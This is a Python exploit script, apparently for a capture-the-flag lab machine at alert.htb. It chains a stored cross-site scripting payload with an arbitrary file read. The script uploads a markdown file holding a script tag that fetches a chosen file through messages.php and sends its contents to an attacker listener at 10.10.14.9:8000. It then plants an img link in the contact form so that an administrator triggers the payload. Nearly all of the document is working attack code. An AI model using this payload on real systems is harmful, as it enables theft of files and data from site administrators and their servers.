import re
import requests
import argparse

def get_link_share(filepath):
    # Define the URL and headers for the first request
    url_visualizer = "http://alert.htb/visualizer.php"
    headers_visualizer = {
        "Host": "alert.htb",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "http://alert.htb",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary75ASVlw7Ii9GnDUp",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://alert.htb/index.php?page=alert",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }

    # Prepare the form data for the first request, using the passed filename (filepath)
    data_visualizer = (
        "------WebKitFormBoundary75ASVlw7Ii9GnDUp\r\n"
        'Content-Disposition: form-data; name="file"; filename="xss.md"\r\n'
        "Content-Type: text/markdown\r\n\r\n"
        "<script>\n"
        f'fetch("http://alert.htb/messages.php/?file={filepath}")\n'
        ".then(response => response.text())\n"
        ".then(xss => {\n"
        'fetch("http://10.10.14.9:8000/?xss=" + encodeURIComponent(xss));\n'
        "})\n"
        ".catch(error => console.error(\"Error fetching the messages:\", error));\n"
        "</script>\n"
        "------WebKitFormBoundary75ASVlw7Ii9GnDUp--\r\n"
    )

    # Send the POST request to the visualizer page
    response_visualizer = requests.post(url_visualizer, headers=headers_visualizer, data=data_visualizer)

    if response_visualizer.status_code != 200:
        print(f"Error: Received status code {response_visualizer.status_code} from {url_visualizer}")
        return None

    # Extract the link_share value from the response
    link_share_match = re.search(r'link_share=([a-zA-Z0-9._]+)', response_visualizer.text)

    if not link_share_match:
        print("Error: link_share value not found.")
        return None

    # Return the extracted link_share
    return link_share_match.group(1)


def send_contact_request(link_share):
    if not link_share:
        print("No link_share provided. Aborting the contact request.")
        return

    # Define the URL and headers for the second request
    url_contact = "http://alert.htb/contact.php"
    headers_contact = {
        "Host": "alert.htb",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "http://alert.htb",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://alert.htb/index.php?page=contact&status=Message%20sent%20successfully!",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }

    # Construct the message with the link_share
    message_content = f"<img src=http://alert.htb/visualizer.php?link_share={link_share} /> \r\n"

    # Define the form data for the contact request
    data_contact = {
        "email": "hacker@htb.com",
        "message": message_content
    }

    # Send the POST request to contact.php
    response_contact = requests.post(url_contact, headers=headers_contact, data=data_contact)

    if response_contact.status_code == 200:
        print("Contact submission successful.")
        print(response_contact.text)
    else:
        print(f"Error: Received status code {response_contact.status_code} from {url_contact}")


def main():
    # Set up argparse to handle command line arguments
    parser = argparse.ArgumentParser(description="Extract and send a contact request with a link share.")
    parser.add_argument("--filepath", help="The filepath to send in the request", required=True)
    args = parser.parse_args()

    # Get the filepath from command line arguments
    filepath = args.filepath

    # First, extract the link_share from the visualizer page
    link_share = get_link_share(filepath)

    if link_share:
        print(f"Extracted link_share: {link_share}")
        # Second, use the extracted link_share to send a request to contact.php
        send_contact_request(link_share)
    else:
        print("Failed to extract link_share. Exiting.")


if __name__ == "__main__":
    main()
